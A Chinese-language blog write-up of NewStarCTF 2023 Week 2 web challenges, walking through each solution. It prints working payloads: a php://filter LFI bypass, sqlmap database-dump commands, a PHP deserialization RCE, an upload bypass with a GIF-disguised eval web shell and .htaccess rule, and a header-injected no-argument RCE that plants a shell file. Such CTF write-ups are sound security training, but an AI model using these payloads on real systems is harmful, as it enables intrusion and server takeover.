# NewStarCTF2023-Week2-Web(AK)


# 游戏高手

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010143346285.png)

这里看到提示，要分数达到100000分才有答案。

那么就要找哪里记录的分数。F12查看资源，发现有一个`app_v2.js`的js文件很可疑，这里进去直接搜索100000，发现如下代码：

```javascript
//游戏结束
function gameover(){
    if(gameScore > 100000){
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/api.php", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var response = JSON.parse(xhr.responseText);
            alert(response.message);
        }
        };
        var data = {
            score: gameScore,
        };
        xhr.send(JSON.stringify(data));
    }
	alert("成绩："+gameScore);
	gameScore=0;  
	curPhase =PHASE_READY;  
	hero = null;
	hero = new Hero();  	    
}
/**********游戏主引擎*********/
```

这里用json送了一个gameScore给/api后台，看来就是gameScore记录的分数。为了简单获取答案，我直接修改gameScore的初始值即可。

由于js已经加载，在F12中的控制台中修改gameScore的值：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010144007947.png)

确认后，开游戏发下分数已经改变，这时候送死就能拿到答案：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010144019480.png)

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010144044272.png)

# include 0。0

这题实际上很简单，但是之前的思路一直是错的。

要知道php://filter/这类伪协议在运行的时候本身就会进行一次urldecode，同时在浏览器中输入也会进行一次urldecode，也就是decode两次。

所以不需要更换其他方法，base64直接urlencode两次就可以拿到flag。

payload:

```url
php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=flag.php
```

 得到flag

```text
//PD9waHAgLy9mbGFnezgwOWYxOWJjLWY3MDYtNGYyYi1hMDEwLTg2MGE3YjU5MDBkNH0K
flag{809f19bc-f706-4f2b-a010-860a7b5900d4}
```

# ez_sql

这里做题的时候直接sqlmap一把梭就直接出结果了。

![image-20231010144803544](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010144803544.png)

```
python sqlmap.py -u "http://..." -dbs
```



![image-20231010145951978](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010145951978.png)

```
python sqlmap.py -u "http://..." -D ctf --tables
```



![image-20231010150019679](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010150019679.png)

```
python sqlmap.py -u "http://..." -D ctf -T here_is_flag --dump
```



![image-20231010150052730](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010150052730.png)

# Unserialize？

![image-20231010150250048](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010150250048.png)

看下对象，发现是cmd私有成员的RCE（在对象摧毁时发生）。

注意两点即可：

+ 由于是private对象，需要encode后输出；
+ php里面字符串不能包含$，考虑其他绕过方式

其他没啥好注意的，基础反序列化题目。

payload：

```php
<?php
class evil {
    private $cmd = "c''at /th1s_1s_fffflllll4444aaaggggg";

    public function __destruct()
    {
        if(!preg_match("/cat|tac|more|tail|base/i", $this->cmd)){
            @system($this->cmd);
        }
    }
}

$a = new evil;
echo urlencode(serialize($a));
?>
```

输出是：

```
O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A36%3A%22c%27%27at+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D
```

传入unser即可拿到flag

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010150651628.png)

# Upload again

这题是有点恶心的，直到我想到上传.htaccess

这题的验证全在后端，经过多次实验主要有两个：

+ 上传**之后**的后缀名有检测。这里常见的phps,php4,php5,php3,phtml,PhP等等可执行的文件都试过了没有用
+ 对上传之后的文件内容有检查：目前发现的就是检查是否含有php或者<?php

第二点好解决，使用下面内容然后改为.gif就可以绕过：

```html
GIF89a<script language="pHp">@eval($_POST['shell']) </script>
```

对于第一点，经我测试只能使用.htaccess改变php解析方式才行：

```
AddType application/x-httpd-php .gif
```

将上述文件保存为.htaccess后上传，将.gif当错php脚本来解析。

这样就可以成功getshell！

# R!!C!!E!!

看题就知道是RCE（废话）

进网页发现要扫描：

![image-20231010151331264](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010151331264.png)

扫描过程就不说了，记得一定要j加-s 1.5不然buuctf扫不了。结果就是git泄露。

这里用githack直接下载文件，发现：

![image-20231010151425741](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010151425741.png)

首先是bo0g1pop.php文件，这个是我们这题的主角：

```php
<?php
highlight_file(__FILE__);
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {
    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){
        eval($_GET['star']);
    }
}
```

看到`/[^\W]+\((?R)?\)/`就明白是无参RCE。但是下面的闲置条件未免也太多了。

我们再看下start.sh，发现flag在根目录，名字就叫flag。

![image-20231010151602898](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010151602898.png)

回到RCE，我们发现scandir没法用。但是我们迫切需要一个数组至少能让我储存路径（/flag）。

这里想了很久。最后发现getallheaders()，它可以返回一个数组，就是所有的请求头的内容。

这里，我们加入一个头zzz（这样可以排在最后，这是个铺垫），然后直接print_r试一试（var_dump也用不了）：

![image-20231010152016731](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010152016731.png)

成功获取！接下来就是和scandir一样的思路。先array_reverse()直接放到数组的第一个，然后用pos()获取内容！

![image-20231010152141256](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010152141256.png)

接下来加上eval就是完全没限制的rce了。由于知道flag的位置了，这里简单点直接`system('cat /flag');`即可拿到答案：

![image-20231010152301992](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010152301992.png)

payload：

```
bo0g1pop.php?star=eval(pos(array_reverse(getallheaders())));
```

```header
zzz: system('cat /flag');
```

当然由于没有限制，这里直接getshell也是可以的：

```header
zzz: fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd]);?>');
```

![image-20231010152521752](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010152521752.png)

![image-20231010152546969](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231010152546969.png)

Week2-Web完结！


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/10/newstarctf2023-week2-web/  

